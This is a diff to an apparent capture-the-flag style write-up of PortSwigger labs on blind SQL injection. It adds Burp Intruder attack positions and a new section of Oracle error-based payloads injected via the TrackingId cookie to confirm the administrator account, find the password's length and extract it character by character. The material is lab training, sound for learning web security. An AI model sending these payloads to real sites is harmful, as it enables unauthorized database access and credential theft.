@@ -2,6 +2,7 @@
 ## Summary
 - [Lab11: Blind SQL injection with conditional responses](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/Blind%20SQL%20injection/Blind%20SQLi%20-%20Boolean%20Based#lab11-blind-sql-injection-with-conditional-responses)
 - [Lab12: Blind SQL injection with conditional errors](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/Blind%20SQL%20injection/Blind%20SQLi%20-%20Boolean%20Based#lab12-blind-sql-injection-with-conditional-errors)
+	- [Another technique using the `WHERE` clause]()
 
 ### Lab11: Blind SQL injection with conditional responses
 - In Blind SQL injection, the application doesn't reply with the results of the query which we injected so we don't see any messages from the server to help us to detect the error to bypass it. 
@@ -67,6 +68,8 @@ TrackingId=xyz' AND (select 'test' FROM users WHERE username='administrator' and
 TrackingId=xyz' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')=112--
 ```
 - But we need to try the ASCII numbers for each char so we will brute-forcing for 20 chars.
+- We will attack these 2 positions:
+> TrackingId=xyz' AND (SELECT ASCII(SUBSTRING(password,`$1-20$`,1)) FROM users WHERE username='administrator')=`$ASCII_numbers$`--
 - You can do that by using an intruder in the burp suite but it will take a long time to finish.
 - We can write a python script to extract the password automatically and quickly.
 - You can see my script from here:[SQLi_lab11_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab11_password_admin.py)
@@ -151,6 +154,7 @@ TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)=1 THEN TO_CHAR(1/0) ELSE 'te
 TrackingId=xyz'||(SELECT CASE WHEN ASCII(SUBSTR(password,1,1))=111 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 - But we need to try the ASCII numbers for each char so we will brute-forcing for 20 chars.
+- You will do the attack for these 2 positions: ASCII(SUBSTR(password,`$1-20$`,1))=`$ASCII_numbers$`
 - You can do that by using an intruder in the burp suite but it will take a long time to finish.
 - We can write a python script to extract the password automatically and quickly.
 - You can see my script from here:[SQLi_lab12_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab12_password_admin.py)
@@ -163,11 +167,28 @@ $ python3 SQLi_lab12_password_admin.py "Target_URl"
 
 - Congrats, and finally, we got the password admin.
 
+---------------------------------------
+### Another technique using the `WHERE` clause
+- There is another technique using the `WHERE` keyword.
+- During executing the condition in the where clause:
+	- If the condition in the where clause is ever true, expression in the select statement is evaluated.
+	- But if the condition in the where clause is False, expression in the select statement is never evaluated.
 
-
-
-
-
-
-
-
+- We can write the payloads in this form like that:
+```
+TrackingId=xyz'||(SELECT TO_CHAR(1/0) from dual where 1=1)--
+TrackingId=xyz'||(SELECT TO_CHAR(1/0) from dual where 1=2)--
+```
+- Here we check if the administrator exists in the `users` table or not.
+- If the administrator exists and `1=1` is true, the expression in the select statement is evaluated and the server will respond with the error message.
+```
+TrackingId=xyz'||(SELECT TO_CHAR(1/0) from users where 1=1 AND username='administrator')--
+```
+Also, You can know the length of the password where you can set the condition in the `WHERE` clause.
+```
+TrackingId=xyz'||(SELECT TO_CHAR(1/0) FROM users WHERE length(password)=1 AND username='administrator')--
+```
+- And here, we can get and extract the password admin using this payload.
+```
+TrackingId=xyz'||(SELECT TO_CHAR(1/0) FROM users WHERE ASCII(SUBSTR(password,1,1))=111 AND username='administrator')--
+```
